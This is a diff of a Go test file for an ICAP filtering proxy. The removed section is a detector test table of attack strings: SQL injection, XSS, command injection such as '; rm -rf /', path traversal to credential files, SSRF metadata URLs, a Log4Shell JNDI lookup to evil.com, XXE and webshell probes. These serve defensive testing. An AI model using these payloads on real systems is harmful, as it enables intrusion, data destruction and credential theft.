@@ -1,385 +1,181 @@
 package main
 
 import (
-	"strings"
+	"bytes"
+	"encoding/json"
+	"io"
+	"net/http"
+	"net/http/httptest"
 	"testing"
+
+	"github.com/go-icap/icap"
 )
 
-// ── Anomaly scoring tests ───────────────────────────────────────────────────
+// mockResponseWriter implements icap.ResponseWriter
+type mockResponseWriter struct {
+	header http.Header
+	code   int
+	resp   interface{}
+}
 
-func TestMatchRulesScoredBlocks(t *testing.T) {
-	tests := []struct {
-		name      string
-		input     string
-		wantBlock bool // score >= blockThreshold
-		wantCat   string
-	}{
-		// SQL Injection
-		{"SQLi UNION SELECT", "id=1 UNION ALL SELECT username,password FROM users", true, "SQL_INJECTION"},
-		{"SQLi DROP TABLE", "'; DROP TABLE users;--", true, "SQL_INJECTION"},
-		{"SQLi WAITFOR DELAY", "1; WAITFOR DELAY '0:0:5'--", true, "SQL_INJECTION"},
-		{"SQLi xp_cmdshell", "EXEC xp_cmdshell('dir')", true, "SQL_INJECTION"},
-		{"SQLi LOAD_FILE", "LOAD_FILE('/etc/passwd')", true, "SQL_INJECTION"},
-		{"SQLi stacked INSERT", "; INSERT INTO users VALUES('hacked','pw')", true, "SQL_INJECTION"},
-		{"SQLi INFORMATION_SCHEMA", "SELECT * FROM INFORMATION_SCHEMA.TABLES", true, "SQL_INJECTION"},
-
-		// XSS
-		{"XSS script tag", "<script>alert(1)</script>", true, "XSS_ATTACKS"},
-		{"XSS javascript:", "javascript:alert(document.cookie)", true, "XSS_ATTACKS"},
-		{"XSS onerror", `<img src=x onerror=alert(1)>`, true, "XSS_ATTACKS"},
-		{"XSS SVG", "<svg onload=alert(1)>", true, "XSS_ATTACKS"},
-		{"XSS data URI", "data:text/html,<script>alert(1)</script>", true, "XSS_ATTACKS"},
-		{"XSS onfocus", `<input onfocus=alert(1) autofocus>`, true, "XSS_ATTACKS"},
-		{"XSS document.cookie", "var x=document.cookie;", true, "XSS_ATTACKS"},
-		{"XSS iframe", "<iframe src=http://evil.com>", true, "XSS_ATTACKS"},
-
-		// Command Injection
-		{"CMDi semicolon cat", "; cat /etc/passwd", true, "COMMAND_INJECTION"},
-		{"CMDi pipe grep", "| grep -r password /", true, "COMMAND_INJECTION"},
-		{"CMDi rm -rf", "; rm -rf /", true, "COMMAND_INJECTION"},
-		{"CMDi powershell", "powershell -e ZWNobyAiaGVsbG8i", true, "COMMAND_INJECTION"},
-		{"CMDi python import", "__import__('os').system('id')", true, "COMMAND_INJECTION"},
-		{"CMDi subshell", "$(cat /etc/passwd)", true, "COMMAND_INJECTION"},
-
-		// Directory Traversal
-		{"DirT basic", "../../../../../../etc/passwd", true, "DIRECTORY_TRAVERSAL"},
-		{"DirT /etc/shadow", "/etc/shadow", true, "DIRECTORY_TRAVERSAL"},
-		{"DirT windows", `C:\windows\system32\config\sam`, true, "DIRECTORY_TRAVERSAL"},
-		{"DirT double encode", "%252e%252e%252f%252e%252e%252fetc/passwd", true, "DIRECTORY_TRAVERSAL"},
-		{"DirT proc self", "/proc/self/environ", true, "DIRECTORY_TRAVERSAL"},
-		{"DirT unicode c0af", "..%c0%af..%c0%afetc/passwd", true, "DIRECTORY_TRAVERSAL"},
-		{"DirT unicode c1af", "..%c1%af..%c1%afwindows/win.ini", true, "DIRECTORY_TRAVERSAL"},
-		{"DirT overlong e0", "..%e0%80%af../etc/shadow", true, "DIRECTORY_TRAVERSAL"},
-
-		// SSRF
-		{"SSRF AWS metadata", "http://169.254.169.254/latest/meta-data/", true, "SSRF"},
-		{"SSRF localhost", "http://127.0.0.1:8080/admin", true, "SSRF"},
-		{"SSRF file protocol", "file:///etc/passwd", true, "SSRF"},
-		{"SSRF GCP metadata", "http://metadata.google.internal/computeMetadata/v1/", true, "SSRF"},
-
-		// Log4Shell
-		{"L4S basic JNDI", "${jndi:ldap://evil.com/a}", true, "LOG4SHELL"},
-		{"L4S nested", "${${lower:j}ndi:ldap://evil.com/a}", true, "LOG4SHELL"},
-		{"L4S env lookup", "${env:AWS_SECRET_KEY}", true, "LOG4SHELL"},
-
-		// XXE
-		{"XXE ENTITY SYSTEM", `<!ENTITY xxe SYSTEM "file:///etc/passwd">`, true, "XXE"},
-		{"XXE DOCTYPE", `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`, true, "XXE"},
-
-		// Prototype Pollution
-		{"PP __proto__", `{"__proto__":{"isAdmin":true}}`, true, "PROTOTYPE_POLLUTION"},
-		{"PP constructor.prototype", `constructor.prototype.isAdmin=true`, true, "PROTOTYPE_POLLUTION"},
-
-		// Path Manipulation
-		{"PATH php filter", "php://filter/convert.base64-encode/resource=index.php", true, "PATH_MANIPULATION"},
-		{"PATH phar", "phar://uploads/evil.jpg", true, "PATH_MANIPULATION"},
-
-		// DLP
-		{"DLP AWS key", "AKIAIOSFODNN7EXAMPLE", true, "CLOUD_SECRETS"},
-		{"DLP GitHub token", "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh", true, "DATA_LEAK_PREVENTION"},
-		{"DLP private key", "-----BEGIN RSA PRIVATE KEY-----", true, "DATA_LEAK_PREVENTION"},
-
-		// Unicode
-		{"UNI zero-width", "admin\u200b@evil.com", true, "UNICODE_OBFUSCATION"},
-		{"UNI RTL override", "file\u202egpj.exe", true, "UNICODE_OBFUSCATION"},
-
-		// Cloud Secrets (critical — always block alone)
-		{"CLOUD AWS IAM key", "AKIAIOSFODNN7EXAMPLE1", true, "CLOUD_SECRETS"},
-		{"CLOUD Google API key", "AIzaSyA1234567890abcdefghijklmnopqrstuvw", true, "CLOUD_SECRETS"},
-		{"CLOUD OpenAI key", "sk-abcdefghijklmnopqrstuvwxyz1234567890abcdefghijk", true, "CLOUD_SECRETS"},
-		{"CLOUD Stripe live", "sk_" + "live_TESTKEY0123456789abcdefgh", true, "CLOUD_SECRETS"},
-		{"CLOUD SendGrid", "SG.abcdefghijklmnopqrstuv.abcdefghijklmnopqrstuvwxyz1234567890abc_efg", true, "CLOUD_SECRETS"},
-		{"CLOUD GitHub OAuth", "gho_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij", true, "CLOUD_SECRETS"},
-
-		// Sensitive Files
-		{"FILE .git/config", "/.git/config", true, "SENSITIVE_FILES"},
-		{"FILE .env", "/.env", true, "SENSITIVE_FILES"},
-		{"FILE wp-config", "/wp-config.php", true, "SENSITIVE_FILES"},
-		{"FILE id_rsa", "/home/user/.ssh/id_rsa", true, "SENSITIVE_FILES"},
-		{"FILE .aws/credentials", "/.aws/credentials", true, "SENSITIVE_FILES"},
-		{"FILE tfstate", "/infra/terraform.tfstate", true, "SENSITIVE_FILES"},
-		{"FILE k8s secrets", "/var/run/secrets/kubernetes.io/serviceaccount/token", true, "SENSITIVE_FILES"},
-
-		// Web Shells & C2
-		{"SHELL c99.php", "/uploads/c99.php", true, "WEBSHELL_C2"},
-		{"SHELL cmd=system", "?cmd=system('id')", true, "WEBSHELL_C2"},
-		{"SHELL recon whoami", "?q=whoami", true, "WEBSHELL_C2"},
-		{"SHELL mimikatz", "sekurlsa::logonpasswords mimikatz", true, "WEBSHELL_C2"},
-		{"SHELL powershell bypass", "powershell -ExecutionPolicy Bypass -File evil.ps1", true, "WEBSHELL_C2"},
-
-		// Crypto Mining & Tunneling (critical — always block alone)
-		{"MINE stratum protocol", "stratum+tcp://pool.minexmr.com:4444", true, "CRYPTO_TUNNEL"},
-		{"MINE xmrig binary", "/download/xmrig-linux-x64", true, "CRYPTO_TUNNEL"},
-
-		// Data Exfiltration (critical — always block alone)
-		{"EXFIL discord webhook", "https://discord.com/api/webhooks/123456/ABCDEF", true, "DATA_EXFIL"},
-
-		// Post-Exploitation
-		{"PEXP net user domain", "net user /domain", true, "POST_EXPLOIT"},
-
-		// Java Deserialization
-		{"JAVA SpEL RCE", "T(java.lang.Runtime).getRuntime().exec('calc')", true, "JAVA_DESER"},
-
-		// SQLi enhanced
-		{"SQLi ORDER BY enum", "?id=1 ORDER BY 15 UNION SELECT 1", true, "SQL_INJECTION"},
-		{"SQLi INTO OUTFILE", "SELECT * INTO OUTFILE '/tmp/dump.csv'", true, "SQL_INJECTION"},
-
-		// Ransomware
-		{"RANSOM extension", "/files/report.crypted", true, "RANSOMWARE"},
-		{"RANSOM instruction", "DECRYPT_INSTRUCTION.txt", true, "RANSOMWARE"},
+func (m *mockResponseWriter) Header() http.Header {
+	if m.header == nil {
+		m.header = make(http.Header)
 	}
+	return m.header
+}
 
-	for _, tt := range tests {
-		t.Run(tt.name, func(t *testing.T) {
-			normalized := normalizeInput(tt.input)
-			matches, score := matchRulesScored(normalized)
-			// Also check raw input for encoded evasion patterns (mirrors engine behavior)
-			if score < blockThreshold && tt.input != normalized {
-				rawMatches, rawScore := matchRulesScored(tt.input)
-				matches = append(matches, rawMatches...)
-				score += rawScore
-			}
-			blocked := score >= blockThreshold
+func (m *mockResponseWriter) WriteHeader(code int, httpMessage interface{}, body bool) {
+	m.code = code
+	m.resp = httpMessage
+}
 
-			if blocked != tt.wantBlock {
-				t.Errorf("input=%q: got blocked=%v (score=%d), want blocked=%v",
-					tt.input, blocked, score, tt.wantBlock)
-			}
-			if tt.wantBlock && len(matches) > 0 {
-				found := false
-				for _, m := range matches {
-					if m.Category == tt.wantCat {
-						found = true
-						break
-					}
-				}
-				if !found {
-					cats := make([]string, len(matches))
-					for i, m := range matches {
-						cats[i] = m.Category + "(" + m.RuleID + ")"
-					}
-					t.Errorf("input=%q: expected category %q, got %v",
-						tt.input, tt.wantCat, cats)
-				}
-			}
-		})
+func (m *mockResponseWriter) Write(p []byte) (int, error) {
+	return len(p), nil
+}
+
+func TestHandleOptions(t *testing.T) {
+	w := &mockResponseWriter{}
+	req := &icap.Request{}
+	handleOptions(w, req)
+	if w.code != 200 {
+		t.Errorf("Expected 200, got %d", w.code)
+	}
+	if w.Header().Get("Methods") != "REQMOD, RESPMOD" {
+		t.Errorf("Expected REQMOD, RESPMOD, got %s", w.Header().Get("Methods"))
 	}
 }
 
-// ── Anomaly scoring composite tests ─────────────────────────────────────────
-
-func TestAnomalyScoringComposite(t *testing.T) {
-	tests := []struct {
-		name      string
-		input     string
-		wantBlock bool
-		minScore  int
-	}{
-		// Single low-severity rule should NOT block
-		{"telegram bot alone (score=7)", "api.telegram.org/bot123", false, 4},
-		// Multiple low-severity rules should combine to block
-		{"pastebin + base64 blob (score > 10)", "pastebin.com/raw/x " + strings.Repeat("A", 200) + "==", true, 10},
-		// .onion alone is severity=7, should NOT block
-		{".onion alone (score=7)", "http://site.onion/page", false, 4},
-		// password= alone is severity=4, should NOT block
-		{"password= alone (score=4)", "password=abc123", false, 2},
+func TestHandleReqmod_Basic(t *testing.T) {
+	w := &mockResponseWriter{}
+	req := &icap.Request{
+		Request: httptest.NewRequest("GET", "http://example.com/safe", nil),
 	}
-
-	for _, tt := range tests {
-		t.Run(tt.name, func(t *testing.T) {
-			normalized := normalizeInput(tt.input)
-			_, score := matchRulesScored(normalized)
-			blocked := score >= blockThreshold
-			if blocked != tt.wantBlock {
-				t.Errorf("input=%q: got blocked=%v (score=%d), want blocked=%v",
-					truncate(tt.input, 80), blocked, score, tt.wantBlock)
-			}
-			if score < tt.minScore {
-				t.Errorf("input=%q: got score=%d, want >= %d",
-					truncate(tt.input, 80), score, tt.minScore)
-			}
-		})
+	handleReqmod(w, req)
+	// Should be 204 No Content for safe URL
+	if w.code != 204 {
+		t.Errorf("Expected 204, got %d", w.code)
 	}
 }
 
-// ── False positive tests ────────────────────────────────────────────────────
-
-func TestLegitimateTrafficNotBlocked(t *testing.T) {
-	legitimate := []struct {
-		name  string
-		input string
-	}{
-		{"Simple URL", "https://www.google.com/search?q=hello+world"},
-		{"API endpoint", "/api/v1/users/123/settings"},
-		{"JSON body", `{"username":"john","email":"john@example.com"}`},
-		{"Form data", "name=John+Doe&email=john%40example.com&city=New+York"},
-		{"Wikipedia", "https://en.wikipedia.org/wiki/SQL"},
-		{"GitHub README", "https://github.com/user/repo/blob/main/README.md"},
-		{"Long query", "https://shop.example.com/products?category=electronics&brand=samsung&sort=price&order=asc&page=2"},
-		{"CSS file", "https://cdn.example.com/assets/style.min.css?v=2.3.1"},
-		{"REST update", `{"status":"active","role":"user","updated_at":"2024-01-15T10:30:00Z"}`},
-		{"Login form", "username=admin&remember=true"},
-		{"Search with special chars", "https://search.example.com/q?term=c%2B%2B+programming"},
-		{"Download PDF", "https://docs.example.com/report_2024.pdf"},
-		{"Calendar date", "https://api.example.com/events?date=2024-01-15&timezone=UTC"},
+func TestHandleReqmod_Blocked(t *testing.T) {
+	w := &mockResponseWriter{}
+	// SQL Injection attempt
+	req := &icap.Request{
+		Request: httptest.NewRequest("GET", "http://example.com/login?u='OR+1=1--", nil),
 	}
-
-	for _, tt := range legitimate {
-		t.Run(tt.name, func(t *testing.T) {
-			normalized := normalizeInput(tt.input)
-			_, score := matchRulesScored(normalized)
-			if score >= blockThreshold {
-				t.Errorf("FALSE POSITIVE: legitimate input %q was blocked (score=%d)", tt.input, score)
-			}
-		})
+	// Set threshold low enough to block
+	blockThreshold = 1
+	handleReqmod(w, req)
+	
+	// Should be 200 OK with the block page attached to the response
+	if w.code != 200 {
+		t.Errorf("Expected 200 for block, got %d", w.code)
+	}
+	resp, ok := w.resp.(*http.Response)
+	if !ok || resp == nil || resp.StatusCode != 403 {
+		t.Errorf("Expected 403 response attached, got %v", w.resp)
 	}
 }
 
-// ── Normalization tests ─────────────────────────────────────────────────────
-
-func TestNormalizeInput(t *testing.T) {
-	tests := []struct {
-		name  string
-		input string
-		want  string
-	}{
-		{"URL decode", "%3Cscript%3E", "<script>"},
-		{"Double encode", "%253Cscript%253E", "<script>"},
-		{"HTML entities", "&#60;script&#62;", "<script>"},
-		{"Null bytes removed", "file%00.txt", "file.txt"},
-		{"Collapse spaces", "a   b   c", "a b c"},
-		{"Plus as space", "hello+world", "hello world"},
+func TestHandleRespmod_Safe(t *testing.T) {
+	w := &mockResponseWriter{}
+	req := &icap.Request{
+		Response: &http.Response{
+			Header: make(http.Header),
+			StatusCode: 200,
+		},
 	}
-
-	for _, tt := range tests {
-		t.Run(tt.name, func(t *testing.T) {
-			got := normalizeInput(tt.input)
-			if got != tt.want {
-				t.Errorf("normalizeInput(%q) = %q, want %q", tt.input, got, tt.want)
-			}
-		})
+	handleRespmod(w, req)
+	if w.code != 204 {
+		t.Errorf("Expected 204, got %d", w.code)
 	}
 }
 
-// ── Tier ordering test ──────────────────────────────────────────────────────
-
-func TestAllRulesHaveValidTier(t *testing.T) {
-	for _, cr := range blockRules {
-		for _, rule := range cr.Rules {
-			if rule.Tier < 1 || rule.Tier > 3 {
-				t.Errorf("Rule %s in %s has invalid tier %d (must be 1-3)",
-					rule.ID, cr.Category, rule.Tier)
-			}
-			if rule.Severity < 1 || rule.Severity > 10 {
-				t.Errorf("Rule %s in %s has invalid severity %d (must be 1-10)",
-					rule.ID, cr.Category, rule.Severity)
-			}
-			if rule.ID == "" {
-				t.Errorf("Rule in %s has empty ID", cr.Category)
-			}
-		}
+func TestHandleRespmod_Blocked(t *testing.T) {
+	w := &mockResponseWriter{}
+	req := &icap.Request{
+		Response: &http.Response{
+			Header: http.Header{"Content-Type": []string{"application/x-msdownload"}},
+			StatusCode: 200,
+			Body: io.NopCloser(bytes.NewReader([]byte("fake executable data"))),
+		},
+	}
+	handleRespmod(w, req)
+	if w.code != 200 {
+		t.Errorf("Expected 200 for block, got %d", w.code)
+	}
+	resp, ok := w.resp.(*http.Response)
+	if !ok || resp == nil || resp.StatusCode != 403 {
+		t.Error("Expected 403 response for dangerous type")
 	}
 }
 
-func TestRuleIDsUnique(t *testing.T) {
-	seen := make(map[string]string)
-	for _, cr := range blockRules {
-		for _, rule := range cr.Rules {
-			if prev, ok := seen[rule.ID]; ok {
-				t.Errorf("Duplicate rule ID %q: in %s and %s", rule.ID, prev, cr.Category)
-			}
-			seen[rule.ID] = cr.Category
-		}
+func TestNotifyBackend_NoAuth(t *testing.T) {
+	// Should return early without panic if env not set
+	notifyBackend(map[string]any{"test": "data"})
+}
+
+func TestHealthEndpoint(t *testing.T) {
+	h := &MgmtHandlers{}
+	req := httptest.NewRequest("GET", "/health", nil)
+	w := httptest.NewRecorder()
+	h.HealthHandler(w, req)
+	
+	if w.Code != http.StatusOK {
+		t.Errorf("Expected 200, got %d", w.Code)
 	}
 }
 
-// ── Benchmark ───────────────────────────────────────────────────────────────
-
-func BenchmarkMatchLegitimateURL(b *testing.B) {
-	input := normalizeInput("https://www.example.com/products?category=electronics&page=2&sort=price")
-	b.ResetTimer()
-	for i := 0; i < b.N; i++ {
-		matchRulesScored(input)
-	}
-}
-
-func BenchmarkMatchMaliciousURL(b *testing.B) {
-	input := normalizeInput("https://example.com/?id=1'+UNION+SELECT+username,password+FROM+users--")
-	b.ResetTimer()
-	for i := 0; i < b.N; i++ {
-		matchRulesScored(input)
-	}
-}
-
-func BenchmarkNormalizeInput(b *testing.B) {
-	input := "%253Cscript%253Ealert%2528document%252Ecookie%2529%253C%252Fscript%253E"
-	b.ResetTimer()
-	for i := 0; i < b.N; i++ {
-		normalizeInput(input)
-	}
-}
-
-// ── Entropy tests ───────────────────────────────────────────────────────────
-
-func TestShannonEntropy(t *testing.T) {
-	tests := []struct {
-		name    string
-		input   string
-		minEntr float64
-		maxEntr float64
-	}{
-		{"empty", "", 0.0, 0.0},
-		{"single char", "aaaa", 0.0, 0.01},
-		{"hello world", "hello world", 2.5, 3.5},
-		{"low entropy path", "/api/v1/users/123", 3.0, 4.0},
-		{"high entropy base64", "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q=", 4.0, 5.5},
-		{"AWS key pattern", "AKIAIOSFODNN7EXAMPLE", 3.5, 4.5},
-		{"random hex", "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6", 3.5, 4.5},
-	}
-
-	for _, tt := range tests {
-		t.Run(tt.name, func(t *testing.T) {
-			got := shannonEntropy(tt.input)
-			if got < tt.minEntr || got > tt.maxEntr {
-				t.Errorf("shannonEntropy(%q) = %.2f, want [%.1f, %.1f]",
-					tt.input, got, tt.minEntr, tt.maxEntr)
-			}
-		})
-	}
-}
-
-func TestStatsCollector(t *testing.T) {
+func TestStatsEndpoint(t *testing.T) {
 	s := &statsCollector{
 		destCounts:     make(map[string]int),
 		categoryCounts: make(map[string]int),
 		uaCounts:       make(map[string]int),
 	}
-
-	f1 := TrafficFeature{Host: "example.com", URLEntropy: 3.0, BodyEntropy: 2.0, UserAgent: "curl/8"}
-	f2 := TrafficFeature{Host: "example.com", URLEntropy: 5.0, BodyEntropy: 1.0, UserAgent: "Mozilla"}
-	f3 := TrafficFeature{Host: "evil.com", URLEntropy: 4.8, BodyEntropy: 4.9, UserAgent: "curl/8"}
-
-	s.record(f1, false, nil)
-	s.record(f2, true, []string{"SQL_INJECTION"})
-	s.record(f3, true, []string{"SSRF", "DATA_EXFIL"})
-
-	snap := s.snapshot()
-
-	if snap["total_requests"].(int64) != 3 {
-		t.Errorf("total_requests = %v, want 3", snap["total_requests"])
-	}
-	if snap["total_blocked"].(int64) != 2 {
-		t.Errorf("total_blocked = %v, want 2", snap["total_blocked"])
-	}
-	if snap["high_entropy_count"].(int64) != 2 {
-		t.Errorf("high_entropy_count = %v, want 2", snap["high_entropy_count"])
+	stats = s // global
+	h := &MgmtHandlers{}
+	req := httptest.NewRequest("GET", "/stats", nil)
+	w := httptest.NewRecorder()
+	h.StatsHandler(w, req)
+	
+	if w.Code != http.StatusOK {
+		t.Errorf("Expected 200, got %d", w.Code)
 	}
 }
 
-func BenchmarkShannonEntropy(b *testing.B) {
-	input := "https://www.example.com/api/v2/search?q=hello+world&page=2&lang=en"
-	b.ResetTimer()
-	for i := 0; i < b.N; i++ {
-		shannonEntropy(input)
+func TestResetEndpoint(t *testing.T) {
+	s := &statsCollector{}
+	stats = s // global
+	h := &MgmtHandlers{}
+	req := httptest.NewRequest("POST", "/reset", nil)
+	w := httptest.NewRecorder()
+	h.ResetHandler(w, req)
+	
+	if w.Code != http.StatusOK {
+		t.Errorf("Expected 200, got %d", w.Code)
 	}
+}
+
+func TestCategoriesEndpoint(t *testing.T) {
+    h := &MgmtHandlers{}
+    req := httptest.NewRequest("GET", "/categories", nil)
+    w := httptest.NewRecorder()
+    h.CategoriesHandler(w, req)
+    
+    if w.Code != http.StatusOK {
+        t.Errorf("Expected 200, got %d", w.Code)
+    }
+}
+
+func TestCategoriesToggleEndpoint(t *testing.T) {
+	h := &MgmtHandlers{}
+	body, _ := json.Marshal(map[string]any{"category": "SQLI", "enabled": false})
+    req := httptest.NewRequest("POST", "/categories/toggle", bytes.NewReader(body))
+    w := httptest.NewRecorder()
+    h.CategoriesToggleHandler(w, req)
+    
+    if w.Code != http.StatusOK {
+        t.Errorf("Expected 200, got %d", w.Code)
+    }
 }
